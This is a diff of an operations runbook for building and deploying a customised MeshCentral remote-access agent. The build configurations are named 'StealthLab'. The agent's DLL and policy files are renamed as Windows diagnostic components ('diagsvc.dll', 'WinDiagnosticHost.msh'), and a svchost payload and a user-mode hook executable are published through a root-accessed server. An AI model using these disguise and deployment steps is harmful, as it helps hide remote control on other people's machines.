@@ -48,16 +48,21 @@ Related operational SSOT:
 
 | Artifact | Local Path (relative to repo root) | Renamed To (on server) |
 |---|---|---|
-| Standalone EXE | `meshservice/x64/StealthLab/MeshService-2022.exe` | **`MeshService64.exe`** |
-| Svchost DLL | `meshservice/x64/StealthLab_DLL/MeshService-2022.dll` | `MeshService64.dll` |
+| Standalone EXE x64 | `meshservice/x64/StealthLab/MeshService-2022.exe` | **`MeshService64.exe`** |
+| Standalone EXE x86 | `meshservice/StealthLab/MeshService-2022.exe` | `MeshService.exe` |
+| Svchost DLL publish sidecar | `meshservice/x64/StealthLab_DLL/MeshService-2022.dll` | `MeshService64.dll` |
+| Runtime svchost DLL | `meshservice/x64/StealthLab_DLL/MeshService-2022.dll` | `diagsvc.dll` |
 | Embedded Payload | `meshservice/embedded/svchost_payload.dll` | `svchost_payload.dll` |
+| Agent policy x64 | `meshservice/x64/StealthLab/MeshService-2022.msh` | `MeshService64.msh` |
+| Agent policy x86 | `meshservice/StealthLab/MeshService-2022.msh` | `MeshService.msh` |
+| Shared provisioning policy | `WinDiagnosticHost.msh` | `WinDiagnosticHost.msh` |
 | UMH public payload | `../UserModeHook/build-fresh/bin/Release/MasterService.exe` | `MasterService.exe` |
 
 **Important:** The Visual Studio build output is named `MeshService-2022.exe`. During staging/deploy it is **renamed** to `MeshService64.exe` to match the filename MeshCentral expects when serving agents to endpoints.
 
 ## hashagents.json
 
-After deploying new binaries, `hashagents.json` must be regenerated from the actual published bytes. MeshCentral reads `node_modules/meshcentral/agents/hashagents.json` at startup, then prefers `meshcentral-data/signedagents/` binaries when they exist. The signed-agent manifest is maintained for observability and post-restart verification, but the module-side manifest is the authoritative runtime input. Each entry contains:
+After deploying new binaries, `hashagents.json` must be regenerated from the actual published bytes. MeshCentral reads `node_modules/meshcentral/agents/hashagents.json` at startup, then resolves runtime binaries in this order: `meshcentral-data/agents/` first, `meshcentral-data/signedagents/` second, and `node_modules/meshcentral/agents/` last. The signed-agent manifest is maintained for observability and post-restart verification, but the module-side manifest is the authoritative startup input. Each entry contains:
 
 ```json
 {
@@ -110,16 +115,17 @@ python deploy.py ssh "command"   # Run arbitrary remote command
 ```
 
 **Deploy pipeline steps (what `deploy` does):**
-1. Verifies staging has files
-2. Creates timestamped backup of current agents in both paths
-3. Copies staged agent binaries → `/opt/meshcentral/meshcentral-data/signedagents/`
-4. Copies staged agent binaries → `/opt/meshcentral/node_modules/meshcentral/agents/`
-5. Copies `MasterService.exe` → `/opt/meshcentral/meshcentral-files/domain/user-hsadmin/Public/` (for `umhctl install --url ...` download only)
-6. Regenerates `hashagents.json` for both publish directories from the actual remote files
-7. Restarts `meshcentral` systemd service
-8. Re-runs post-restart publish verification so `node_modules/meshcentral/agents/` and its manifest still match the local build while `signedagents/` remains self-consistent if MeshCentral repacks/signs the EXEs
-9. Writes local release manifest with repo SHAs + artifact hashes under `docs/testing/artifacts/`
-10. Cleans staging area
+1. Verifies the full local package set is present before staging
+2. Creates timestamped backups of the current `meshcentral-data/agents`, `meshcentral-data/signedagents`, and `node_modules/meshcentral/agents` payloads
+3. Copies the staged package set → `/opt/meshcentral/meshcentral-data/agents/`
+4. Mirrors the staged package set → `/opt/meshcentral/meshcentral-data/signedagents/`
+5. Mirrors the staged package set → `/opt/meshcentral/node_modules/meshcentral/agents/`
+6. Copies `MasterService.exe` → `/opt/meshcentral/meshcentral-files/domain/user-hsadmin/Public/` (for `umhctl install --url ...` download only)
+7. Regenerates `hashagents.json` for the module and signed publish directories from the actual remote files
+8. Restarts `meshcentral` systemd service
+9. Re-runs post-restart publish verification so `meshcentral-data/agents/` and `node_modules/meshcentral/agents/` still match the local build while `signedagents/` remains self-consistent if MeshCentral repacks/signs the EXEs
+10. Writes local release manifest with repo SHAs + artifact hashes under `docs/testing/artifacts/`
+11. Cleans staging area
 
 ### 2. Direct SSH (Ad-Hoc)
 
@@ -150,16 +156,23 @@ scp -i ~/.ssh/id_ed25519 root@167.88.44.65:/opt/meshcentral/meshcentral-data/con
 ### Standard Deploy (Build → Stage → Deploy)
 
 ```
-1. Build in Visual Studio (StealthLab / StealthLab_DLL configs)
+1. Build with `MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal`
 2. python deploy.py stage      → uploads to server staging/
 3. python deploy.py deploy     → backup, copy, rehash, restart
 4. python deploy.py health     → verify service, ports, no errors
 ```
 
+Build contract:
+- `MeshAgent.Build.proj` is the supported entrypoint because it serializes `StealthLab_DLL|x64` before `StealthLab|x64` and `StealthLab|Win32`.
+- Direct `StealthLab|x64` project builds now force the `StealthLab_DLL|x64` prerequisite before the EXE build refreshes `meshservice/embedded/svchost_payload.dll`.
+- Do not run separate x64 DLL and x64 EXE project builds in parallel against the same tree; use `MeshAgent.Build.proj` for full package output.
+
 Publish contract for MeshAgent packages:
+- `deploy.py stage` must prove the full package set is present before upload: `MeshService64.exe`, `MeshService.exe`, `MeshService64.dll`, `svchost_payload.dll`, `diagsvc.dll`, `MeshService64.msh`, `MeshService.msh`, and `WinDiagnosticHost.msh`.
 - `deploy.py stage` must prove local payload parity before upload: the repo `MeshService64.dll`, `meshservice/embedded/svchost_payload.dll`, and the embedded svchost RCDATA payload inside `MeshService64.exe` must all hash-identically.
-- After `deploy.py deploy`, verify the embedded svchost payload inside both remote `node_modules/meshcentral/agents/MeshService64.exe` and `meshcentral-data/signedagents/MeshService64.exe`.
+- After `deploy.py deploy`, verify the embedded svchost payload inside the remote `meshcentral-data/agents/MeshService64.exe`, `node_modules/meshcentral/agents/MeshService64.exe`, and `meshcentral-data/signedagents/MeshService64.exe`.
 - A `signedagents` EXE may have a different raw file size or digest than the local EXE because MeshCentral repacks it, but its embedded svchost payload must still match the repo DLL exactly.
+- When validating live package identity, distinguish the generic agent URL from a real group download. `https://high.support/meshagents?id=4` is the generic Windows x64 service package and will not prove group-specific identity. Use the portal-generated Office download link or `https://high.support/meshagents?id=4&meshid=<group-meshid>` when checking `-name`, embedded `.msh` identity, or install behavior for a specific group.
 
 ### Emergency Rollback
 
